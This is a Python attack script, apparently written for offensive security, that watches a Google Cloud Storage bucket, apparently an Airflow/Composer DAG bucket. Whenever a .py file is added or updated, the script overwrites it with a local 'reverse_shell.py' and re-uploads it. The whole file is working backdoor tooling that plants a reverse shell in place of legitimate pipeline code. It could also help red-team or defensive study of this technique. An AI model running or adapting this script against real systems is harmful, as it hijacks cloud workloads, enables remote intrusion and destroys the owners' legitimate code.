import os
import sys
import time
import zipfile
import shutil
from google.cloud import storage
from distutils.dir_util import copy_tree

# Capture the bucket name from command line arguments
if len(sys.argv) < 2:
    print("Usage: python backdoor_dag_bucket.py <bucket_name>")
    sys.exit(1)

bucket_name = sys.argv[1]

# Initialize the GCS client
client = storage.Client()
bucket = client.get_bucket(bucket_name)

def list_blobs():
    """List all blobs in the bucket and their metadata."""
    blobs = bucket.list_blobs()
    return {blob.name: (blob.updated, blob.md5_hash) for blob in blobs}

def handle_py_file(py_name, local_backdoor):
    """Handle local folder operations and re-upload the python file."""
    
    shutil.copyfile(local_backdoor, py_name)
    blob = bucket.blob(py_name)
    blob.upload_from_filename(py_name)
    print(f"Uploaded new DAG file: {py_name}")
    os.remove(py_name)


def monitor_bucket():
    """Monitor the bucket for changes every `interval` seconds."""
    print("Monitoring bucket for changes...")
    local_backdoor = './reverse_shell.py'
    last_state = list_blobs()
    print(f"Initial state:")
    for file_name, (updated, md5_hash) in last_state.items():
        print(f"File: {file_name}, Updated: {updated}, MD5 Hash: {md5_hash}")

    while True:
        current_state = list_blobs()
        modified_files = []

        # Check for added or updated files
        for file_name, updated in current_state.items():
            if file_name not in last_state and file_name.endswith('.py'):
                print(f"New file: {file_name}")
                modified_files.append(file_name)
            
            elif last_state[file_name][1] != current_state[file_name][1] and file_name.endswith('.py'):
                print(f"Updated file: {file_name}")
                modified_files.append(file_name)

        # Handle added or updated ZIP files
        if modified_files:
            print("Change detected in bucket!")
            for file in modified_files:
                print(f"Updated file: {file}")
                if file.endswith('.py'):
                    handle_py_file(file, local_backdoor)

        # Update last known state
        last_state = current_state

if __name__ == '__main__':
    monitor_bucket()
